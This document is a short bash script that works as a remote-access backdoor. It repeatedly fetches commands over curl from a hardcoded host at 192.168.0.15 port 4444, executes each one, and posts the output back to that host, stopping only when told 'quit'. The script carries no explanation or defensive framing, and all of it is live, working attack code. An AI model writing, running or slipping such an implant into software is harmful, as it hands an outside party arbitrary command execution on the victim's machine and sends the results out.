HOST=192.168.0.15
PORT=4444
while true; do
	cmd=$(curl -sk "$HOST:$PORT/getcmd")
	if [[ "$cmd" == "quit" ]]; then
		exit 0
	fi

	result=$(exec $cmd 2>&1)
	curl -sk "$HOST:$PORT/report" -d "$result"
	sleep 1
done
